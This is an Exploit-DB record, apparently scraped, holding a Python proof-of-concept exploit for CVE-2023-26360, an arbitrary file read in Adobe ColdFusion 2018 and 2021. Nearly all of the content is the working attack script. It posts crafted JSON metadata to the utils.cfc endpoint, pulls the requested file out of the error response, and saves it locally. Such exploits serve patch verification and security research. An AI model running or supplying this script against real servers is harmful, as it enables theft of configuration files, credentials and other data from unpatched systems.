{"source": "https://www.exploit-db.com/exploits/51875", "vulnName": "Adobe ColdFusion versions 2018,15 (and earlier) and 2021,5 and earlier - Arbitrary File Read", "vulnEDBID": "51875", "vulnCVE": "N/A", "author": "YOUSSEF MUHAMMAD", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-11", "vulnContent": "# Exploit Title: File Read Arbitrary Exploit for CVE-2023-26360\n# Google Dork: [not]\n# Date: [12/28/2023]\n# Exploit Author: [Youssef Muhammad]\n# Vendor Homepage: [\nhttps://helpx.adobe.com/coldfusion/kb/coldfusion-downloads.html]\n# Software Link: [\nhttps://drive.google.com/drive/folders/17ryBnFhswxiE1sHrNByxMVPKfUnwqmp0]\n# Version: [Adobe ColdFusion versions 2018,15 (and earlier) and 2021,5 and\nearlier]\n# Tested on: [Windows, Linux]\n# CVE : [CVE-2023-26360]\n\nimport sys\nimport requests\nimport json\n\nBANNER = \"\"\"\n   \u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588        \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588  \n  \u2588\u2588      \u2588\u2588    \u2588\u2588 \u2588\u2588                 \u2588\u2588 \u2588\u2588  \u2588\u2588\u2588\u2588      \u2588\u2588      \u2588\u2588            \u2588\u2588 \u2588\u2588            \u2588\u2588 \u2588\u2588       \u2588\u2588  \u2588\u2588\u2588\u2588 \n  \u2588\u2588      \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588  \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588 \n  \u2588\u2588       \u2588\u2588  \u2588\u2588  \u2588\u2588            \u2588\u2588      \u2588\u2588\u2588\u2588  \u2588\u2588 \u2588\u2588           \u2588\u2588       \u2588\u2588      \u2588\u2588    \u2588\u2588      \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588  \u2588\u2588 \n   \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588        \u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588                                                                                                                                                                                                                                       \n\"\"\"\n\nRED_COLOR = \"\\033[91m\"\nGREEN_COLOR = \"\\032[42m\"\nRESET_COLOR = \"\\033[0m\"\n\ndef print_banner():\n    print(RED_COLOR + BANNER + \"                  Developed by SecureLayer7\" + RESET_COLOR)\n    return 0\n\ndef run_exploit(host, target_file, endpoint=\"/CFIDE/wizards/common/utils.cfc\", proxy_url=None):\n    if not endpoint.endswith('.cfc'):\n        endpoint += '.cfc'\n\n    if target_file.endswith('.cfc'):\n        raise ValueError('The TARGET_FILE must not point to a .cfc')\n\n    targeted_file = f\"a/{target_file}\"\n    json_variables = json.dumps({\"_metadata\": {\"classname\": targeted_file}, \"_variables\": []})\n\n    vars_get = {'method': 'test', '_cfclient': 'true'}\n    uri = f'{host}{endpoint}'\n\n    response = requests.post(uri, params=vars_get, data={'_variables': json_variables}, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)\n\n    file_data = None\n    splatter = '<!-- \" ---></TD></TD></TD></TH></TH></TH>'\n\n    if response.status_code in [404, 500] and splatter in response.text:\n        file_data = response.text.split(splatter, 1)[0]\n\n    if file_data is None:\n        raise ValueError('Failed to read the file. Ensure the CFC_ENDPOINT, CFC_METHOD, and CFC_METHOD_PARAMETERS are set correctly, and that the endpoint is accessible.')\n\n    print(file_data)\n\n    # Save the output to a file\n    output_file_name = 'output.txt'\n    with open(output_file_name, 'w') as output_file:\n        output_file.write(file_data)\n        print(f\"The output saved to {output_file_name}\")\n\nif __name__ == \"__main__\":\n    if not 3 <= len(sys.argv) <= 5:\n        print(\"Usage: python3 script.py <host> <target_file> [endpoint] [proxy_url]\")\n        sys.exit(1)\n\n    print_banner()\n\n    host = sys.argv[1]\n    target_file = sys.argv[2]\n    endpoint = sys.argv[3] if len(sys.argv) > 3 else \"/CFIDE/wizards/common/utils.cfc\"\n    proxy_url = sys.argv[4] if len(sys.argv) > 4 else None\n\n    try:\n        run_exploit(host, target_file, endpoint, proxy_url)\n    except Exception as e:\n        print(f\"Error: {e}\")\n            "}